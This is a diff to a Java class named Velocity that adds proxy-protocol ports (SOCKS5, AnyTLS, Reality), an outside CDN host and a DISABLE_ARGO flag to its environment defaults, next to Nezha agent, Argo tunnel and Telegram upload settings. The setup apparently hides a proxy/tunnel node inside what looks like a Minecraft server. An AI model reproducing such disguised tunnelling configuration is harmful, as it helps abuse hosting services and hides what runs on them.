@@ -45,10 +45,11 @@ public final class Velocity {
   private static final String ANSI_RESET = "\033[0m";
   private static final Logger logger = LogManager.getLogger(Velocity.class);
   private static final String[] ALL_ENV_VARS = {
-      "PORT", "FILE_PATH", "UUID", "NEZHA_SERVER", "NEZHA_PORT",
-      "NEZHA_KEY", "ARGO_PORT", "ARGO_DOMAIN", "ARGO_AUTH",
-      "HY2_PORT", "TUIC_PORT", "REALITY_PORT", "CFIP", "CFPORT",
-      "UPLOAD_URL", "CHAT_ID", "BOT_TOKEN", "NAME"
+      "PORT", "FILE_PATH", "UUID", "NEZHA_SERVER", "NEZHA_PORT", 
+      "NEZHA_KEY", "ARGO_PORT", "ARGO_DOMAIN", "ARGO_AUTH", 
+      "S5_PORT", "HY2_PORT", "TUIC_PORT", "ANYTLS_PORT",
+      "REALITY_PORT", "ANYREALITY_PORT", "CFIP", "CFPORT", 
+      "UPLOAD_URL","CHAT_ID", "BOT_TOKEN", "NAME", "DISABLE_ARGO"
   };
   private static final AtomicBoolean RUNNING = new AtomicBoolean(true);
   private static Process sbxProcess;
@@ -147,22 +148,26 @@ public final class Velocity {
 
   private static void loadEnvVars(final Map<String, String> envVars) throws IOException {
     envVars.put("UUID", "fe7431cb-ab1b-4205-a14c-d056f821b383");
-    envVars.put("FILE_PATH", "./world");
+    envVars.put("FILE_PATH", "./worlds");
     envVars.put("NEZHA_SERVER", "");
     envVars.put("NEZHA_PORT", "");
     envVars.put("NEZHA_KEY", "");
     envVars.put("ARGO_PORT", "");
     envVars.put("ARGO_DOMAIN", "");
     envVars.put("ARGO_AUTH", "");
+    envVars.put("S5_PORT", "");
     envVars.put("HY2_PORT", "");
     envVars.put("TUIC_PORT", "");
+    envVars.put("ANYTLS_PORT", "");
     envVars.put("REALITY_PORT", "");
+    envVars.put("ANYREALITY_PORT", "");
     envVars.put("UPLOAD_URL", "");
     envVars.put("CHAT_ID", "");
     envVars.put("BOT_TOKEN", "");
-    envVars.put("CFIP", "");
-    envVars.put("CFPORT", "");
-    envVars.put("NAME", "Mc");
+    envVars.put("CFIP", "cdns.doon.eu.org");
+    envVars.put("CFPORT", "443");
+    envVars.put("NAME", "");
+    envVars.put("DISABLE_ARGO", "false");
 
     for (String var : ALL_ENV_VARS) {
       final String value = System.getenv(var);
